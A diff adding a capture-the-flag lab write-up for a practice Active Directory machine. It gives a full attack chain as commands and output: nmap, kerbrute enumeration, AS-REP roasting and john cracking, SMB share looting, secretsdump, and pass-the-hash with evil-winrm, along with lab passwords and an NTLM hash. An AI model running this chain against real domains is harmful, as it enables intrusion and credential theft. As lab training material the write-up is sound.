@@ -1,0 +1,68 @@
+Room: attacktivedirectory
+
+1. Enumeration
+
+## Enumeration with NMAP:
+	
+	`nmap -sC -sV -sS -p- -T5 -o nmap/scan.txt <Machine_IP>`
+	
+	53/tcp    open  domain        Simple DNS Plus
+	80/tcp    open  http          Microsoft IIS httpd 10.0
+	88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-22 19:28:58Z)
+	135/tcp   open  msrpc         Microsoft Windows RPC
+	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+	389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
+	445/tcp   open  microsoft-ds?
+	464/tcp   open  kpasswd5?
+	593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+	636/tcp   open  tcpwrapped
+	3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
+	3269/tcp  open  tcpwrapped
+	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	9389/tcp  open  mc-nmf        .NET Message Framing
+	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	
+## User enumeration with Kerberos
+
+	* Kerberos port is open, we can try enumerating users by using kerbrute.
+	
+		Notable accounts (with no pre-auth)
+		
+		- svc-admin
+		- backup
+		
+2. Exploitation
+
+	* Before we found that svc-admin doesn't have pre-auth, so we can ASREPRoast.
+	`impacket-GetNPUsers -dc-host spookysec.local -outputfile hash/ntlmasreproasting.hash -usersfile creds/kerbrute_userenum.txt spookysec.local/ -format john -no-pass`
+	
+	* After we retreived the hash we can crack it with john the ripper
+	`john --format=krb5asrep --wordlist=creds/passwordlist.txt hash/ntlmasreproasting.hash`
+	
+		- svc-admin:management2005
+
+	* When we got credentials we can enumerate all smb shares
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  Share           Permissions     Remark
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  -----           -----------     ------
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  backup          READ            
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  C$                              Default share
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
+	SMB         10.114.153.8    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
+	
+	* Then we can connect to backup share
+	`smbclient //10.114.153.8/backup -U "spookysec.local/svc-admin%management2005"`
+	
+		- Inside of this share i found a file "backup_credentials.txt", to download i can use command `get`
+		`get backup_credentials.txt`
+		
+			- This file contains base64 encoded credentials from "backup" account
+			backup@spookysec.local:backup2517860
+			
+	* Dump all secrets with impacket's `secretsdump`
+	`impacket-secretsdump "spookysec.local/backup:backup2517860@10.114.153.8"`
+	
+	* Use Administrator's NTLM hash to connect to pwsh session using `evil-winrm`
+	`evil-winrm -i 10.114.153.8 -u "Administrator" -H "0e0363213e37b94221497260b0bcb4fc"`
